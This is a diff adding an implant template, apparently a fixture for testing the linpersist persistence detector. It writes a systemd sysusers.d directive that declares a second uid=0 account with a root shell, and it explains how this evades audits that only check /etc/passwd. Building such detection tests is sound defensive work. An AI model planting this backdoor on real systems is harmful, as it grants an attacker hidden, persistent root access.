@@ -1,0 +1,20 @@
+# Implant template: sysusers-second-uid-zero (L1, armed)
+#
+# sysusers.d directive declaring a second uid=0 account with a name
+# other than "root". systemd-sysusers materialises the user into
+# /etc/passwd at next boot, but the SOURCE of the implant lives in
+# /etc/sysusers.d/ -- audits that focus on /etc/passwd see a normal
+# uid=0 line; the directive that PUT it there is invisible to that
+# view. linpersist's sysusers module fires sysusers_uid_zero on
+# this pattern; the detections.yaml rule `sysusers_second_uid_zero`
+# (critical) promotes it to Q7.
+#
+# Variables: ${sysusers_file}, ${attacker_user}, ${gecos}
+
+RUN mkdir -p $$(dirname ${sysusers_file}) && \
+    printf '%s\n' \
+        '# Implant: declare a second uid=0 account via sysusers.d.' \
+        'u ${attacker_user} 0 "${gecos}" /root /bin/bash' \
+        > ${sysusers_file} && \
+    chown root:root ${sysusers_file} && \
+    chmod 0644 ${sysusers_file}
